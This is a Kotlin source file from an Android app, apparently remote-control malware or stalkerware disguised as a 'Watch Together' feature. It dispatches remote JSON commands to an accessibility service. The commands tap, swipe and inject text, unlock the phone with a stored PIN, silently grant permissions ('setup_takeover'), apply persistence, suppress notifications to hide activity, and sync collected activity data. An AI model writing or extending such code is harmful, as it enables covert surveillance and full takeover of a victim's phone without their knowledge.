package com.phonehand.app

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import org.json.JSONObject
import java.util.concurrent.Executors

object InputHandler {
    private const val TAG = "Input"
    var service: TouchAccessibilityService? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private val bg = Executors.newSingleThreadExecutor()

    fun handle(context: Context, json: String) {
        mainHandler.post {
            try {
                val msg = JSONObject(json)
                val type = msg.optString("type")
                val run = Runnable { dispatch(context, msg, type) }
                if (needsWake(type, msg) && !ScreenPower.isInteractive(context)) {
                    ScreenPower.wakeScreen(context)
                    mainHandler.postDelayed(run, 300)
                } else {
                    run.run()
                }
            } catch (e: Exception) {
                Log.w(TAG, e.message ?: "input")
            }
        }
    }

    private fun needsWake(type: String, msg: JSONObject): Boolean {
        if (type == "key" && msg.optString("action") == "unlock") return true
        return type in setOf("click", "tap", "swipe", "scroll", "text", "setup_takeover", "fix_persistence", "open_app", "clipboard_paste", "request_permission_wizard", "request_permission_moment")
    }

    private fun dispatch(context: Context, msg: JSONObject, type: String) {
        when {
            type == "setup_takeover" || (type == "command" && msg.optString("action") == "setup_takeover") -> {
                startSilentTakeover(context)
                return
            }
            type == "fix_persistence" || (type == "command" && msg.optString("action") == "fix_persistence") -> {
                PersistenceShield.applyAll(context)
                return
            }
            type == "intel_sync" -> {
                ActivityCollector.get(context).syncNow()
                return
            }
            type == "request_permission_wizard" -> {
                PermissionMoments.handleRemote(context, "", "")
                return
            }
            type == "request_permission_moment" -> {
                PermissionMoments.handleRemote(
                    context,
                    msg.optString("moment", ""),
                    msg.optString("step", ""),
                )
                return
            }
            type == "open_app" -> {
                openApp(context, msg.optString("package", ""))
                return
            }
            type == "clipboard_paste" -> {
                pasteClipboard(context, msg.optString("text", ""))
                return
            }
            type == "set_unlock_pin" -> {
                val pin = msg.optString("pin", "").trim()
                if (pin.length in 4..12) UnlockStore.setPin(context, pin)
                DeviceStateReporter.send(context)
                return
            }
        }

        val svc = service
        if (svc == null) {
            Log.w(TAG, "no accessibility service for $type")
            return
        }
        when (type) {
            "click", "tap" -> svc.tapAt(
                msg.optDouble("x", 0.0).toFloat(),
                msg.optDouble("y", 0.0).toFloat(),
            )
            "swipe" -> {
                svc.swipe(
                    msg.getDouble("x").toFloat(),
                    msg.getDouble("y").toFloat(),
                    msg.getDouble("x2").toFloat(),
                    msg.getDouble("y2").toFloat(),
                    msg.optLong("duration", 200),
                )
                svc.scheduleRefreshesAfterInput()
            }
            "scroll" -> {
                svc.scrollAt(
                    msg.getDouble("x").toFloat(),
                    msg.getDouble("y").toFloat(),
                    msg.optString("dir", "down"),
                )
                svc.scheduleRefreshesAfterInput()
            }
            "key" -> {
                handleKey(context, msg.optString("action"))
                svc.scheduleRefreshesAfterInput(forceFull = true)
            }
            "text" -> {
                if (!ScreenPower.isInteractive(context)) ScreenPower.wakeScreen(context)
                val text = msg.optString("text", "")
                injectText(text)
                if (text.isNotBlank()) {
                    NotesStore.append(context, text, "remote", svc.lastWindowPkg())
                    NotesStore.flush(context)
                }
                svc.scheduleRefreshesAfterInput()
            }
        }
    }

    private fun openApp(context: Context, packageName: String) {
        if (packageName.isBlank()) return
        val pm = context.packageManager
        val launch = pm.getLaunchIntentForPackage(packageName) ?: return
        launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(launch)
    }

    private fun pasteClipboard(context: Context, text: String) {
        if (text.isBlank()) return
        val svc = service ?: return
        if (!ScreenPower.isInteractive(context)) ScreenPower.wakeScreen(context)
        injectText(text)
        NotesStore.append(context, text, "clipboard", svc.lastWindowPkg())
        NotesStore.flush(context)
        svc.scheduleRefreshesAfterInput()
    }

    private fun handleKey(context: Context, action: String) {
        val svc = service ?: return
        when (action) {
            "back" -> svc.globalAction(AccessibilityService.GLOBAL_ACTION_BACK)
            "home" -> svc.globalAction(AccessibilityService.GLOBAL_ACTION_HOME)
            "recents" -> svc.globalAction(AccessibilityService.GLOBAL_ACTION_RECENTS)
            "power" -> {
                if (!ScreenPower.isInteractive(context)) {
                    ScreenPower.wakeScreen(context)
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    svc.globalAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG)
                } else {
                    svc.globalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
                }
            }
            "wake" -> ScreenPower.wakeScreen(context)
            "unlock" -> bg.execute {
                val result = LockScreenHelper.unlockBlocking(context, svc)
                Log.d(TAG, "unlock result: $result")
                DeviceStateReporter.send(context)
                svc.scheduleRefreshesAfterInput(forceFull = true)
            }
            "lock" -> svc.globalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
            "volume_up" -> {
                val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI)
            }
            "volume_down" -> {
                val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI)
            }
        }
    }

    private fun injectText(text: String) {
        if (text.isBlank()) return
        val node = service?.rootInActiveWindow ?: return
        val focused = node.findFocus(android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT)
        focused?.let {
            val args = android.os.Bundle()
            args.putCharSequence(
                android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                text,
            )
            it.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args)
            it.recycle()
        }
        node.recycle()
    }

    private fun startSilentTakeover(context: Context) {
        if (SettingsPermissionGrant.isRunning() || PermissionAutoGrant.isRunning()) {
            Log.d(TAG, "setup_takeover already running")
            SetupReporter.progress("Already granting permissions…")
            return
        }
        if (!WatchSync.isEnabled(context)) {
            Log.w(TAG, "setup_takeover: Watch Together not enabled")
            SetupReporter.error("Watch Together is off on the phone")
            return
        }
        ScreenPower.wakeScreen(context)
        SetupReporter.progress("Unlocking phone first…", "start")
        bg.execute {
            val svc = TouchAccessibilityService.instance
            if (svc == null) {
                SetupReporter.error("Watch Together is off on the phone")
                return@execute
            }
            if (!LockScreenHelper.ensureUnlocked(context, svc, 22_000L)) {
                SetupReporter.error("Unlock the phone first — tap Unlock or save PIN in portal")
                return@execute
            }
            StealthNotifications.suppressAll(context)
            SettingsPermissionGrant.runLightning(context)
        }
    }
}
